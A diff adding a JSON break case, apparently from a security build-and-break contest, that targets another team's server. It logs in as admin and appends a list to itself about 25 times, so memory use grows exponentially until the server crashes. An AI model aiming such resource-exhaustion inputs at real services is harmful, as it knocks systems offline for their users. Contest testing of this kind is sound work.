@@ -1,0 +1,11 @@
+{
+	"type":"crash",
+	"target_team": "Javascript-is-not-THAT-bad",
+	"arguments": {
+		"argv":["%PORT%"],
+		"base64":false
+	},
+	"programs": [
+		{"program": "as principal admin password \"admin\" do\nset x = []\nappend to x with \"s\"\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nappend to x with x\nreturn []\n***", "base64": false}
+	]
+}
